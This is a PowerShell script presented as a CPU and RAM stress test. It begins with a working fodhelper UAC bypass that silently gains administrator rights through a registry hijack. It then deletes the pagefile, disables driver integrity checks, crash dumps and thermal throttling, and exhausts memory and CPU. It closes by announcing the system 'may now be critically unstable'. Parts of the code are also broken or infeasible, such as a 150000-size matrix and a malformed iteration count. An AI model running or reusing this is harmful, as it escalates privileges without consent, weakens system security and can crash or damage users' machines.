# Self-elevate silently via UAC bypass
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    # Create registry entries for fodhelper bypass
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    # Trigger elevation via trusted Microsoft binary
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    
    # Cleanup and exit non-admin instance
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# Dynamic RAM calculation (90% of total physical RAM)
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$chunkSize = [Int64](8 * 1024 * 1024 * 1024)
$targetSize = $physicalMem * 0.9

# System configuration tweaks
Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"

# Disable memory optimizations
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
# Disable crash dumps
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force

# Overcommit memory
$null = [System.GC]::AddMemoryPressure(1TB)

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT


# CPU/RAM stress configuration
$threads = [Environment]::ProcessorCount
$chunksNeeded = [math]::Ceiling($targetSize / $chunkSize)
$chunksNeeded = [Int64]$chunksNeeded
$jobs = @()

# **Job Script Block**
$jobScript = {
    param($jobIndex, [Int64]$chunkSize, [Int64]$chunksNeeded)
    # **CPU Stress Functions**
    function Stress-CPU {
        param($iterations)
        $data = [byte[]]::new(8192)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
        1..$iterations | ForEach-Object {
            $data = [System.Security.Cryptography.SHA512]::HashData($data)
        }
    }

    # **Memory Stress Function**
    function Stress-Memory {
        param($chunkSize, $chunksNeeded)
        $mem = [byte[]]::new($chunkSize)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($mem)
        
        # **Matrix Multiplication Stress**
        $size = 150000
        $A = @(); $B = @(); $C = @()
        0..($size-1) | ForEach-Object {
            $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1 -Max 1000000 })
            $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1 -Max 1000000 })
            $C += ,@(1..$size | ForEach-Object { 0 })
        }
        # Matrix multiplication (O(n³) complexity)
        0..($size-1) | ForEach-Object { $i = $_
            0..($size-1) | ForEach-Object { $j = $_
                $sum = 0
                0..($size-1) | ForEach-Object { $k = $_
                    $sum += $A[$i][$k] * $B[$k][$j]
                }
                $C[$i][$j] = $sum
            }
        }

        # **Prime Factorization Stress**
        Get-Primes 9889396939693
    }

    # **Prime Factorization Function**
    function Get-Primes {
        param($n)
        $factors = @()
        for ($i = 2; $i -le $n; $i++) {
            while ($n % $i -eq 0) {
                $factors += $i
                $n = [math]::Floor($n / $i)
            }
        }
        return $factors
    }

    # **Main Stress Loop**
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # **RAM Pressure (No Garbage Collection)**
    $memChunks = [System.Collections.Generic.List[byte[]]]::new()
    for ($i = 0; $i -lt $chunksNeeded; $i++) {
        $memChunks.Add([byte[]]::new($chunkSize))
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($memChunks[$i])
        Write-Progress -Activity "Job $args[0]: Memory Stress" -Status "Chunk $i" -PercentComplete (($i / $chunksNeeded) * 100)
    }

    # **CPU Pressure**
    $hashIterations = 10,000,000
    Stress-CPU -iterations $hashIterations
    Write-Progress -Activity "Job $args[0]: CPU Stress" -Completed
    Write-Host "Job $args[0]: Stress test completed!"
}

# **Job Execution**
for ($i = 1; $i -le $threads; $i++) {
    $jobs += Start-Job -ScriptBlock $jobScript -ArgumentList $i, $chunkSize, $chunksNeeded
}

# **Job Monitoring**
$jobs | ForEach-Object {
    Wait-Job -Job $_
    Receive-Job -Job $_
    Remove-Job -Job $_ -Force
}

Write-Host "All jobs completed. System may now be critically unstable."

pause
